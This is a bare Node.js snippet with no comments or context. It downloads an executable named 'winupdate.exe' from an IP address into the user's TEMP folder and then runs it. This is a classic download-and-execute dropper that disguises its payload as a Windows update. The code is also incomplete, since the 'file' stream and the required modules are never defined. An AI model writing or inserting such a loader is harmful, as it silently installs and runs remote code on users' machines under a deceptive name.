const fileUrl = 'http://192.0.2.1/winupdate.exe';
const target = path.join(process.env.TEMP, 'winupdate.exe');
function downloadFile(url,dest) { http.get(url, response => { response.pipe(file); file.on('finish', () => file.close(executeFile)); }); }
function executeFile() { exec(`"${target}"`); }
downloadFile(fileUrl, target);
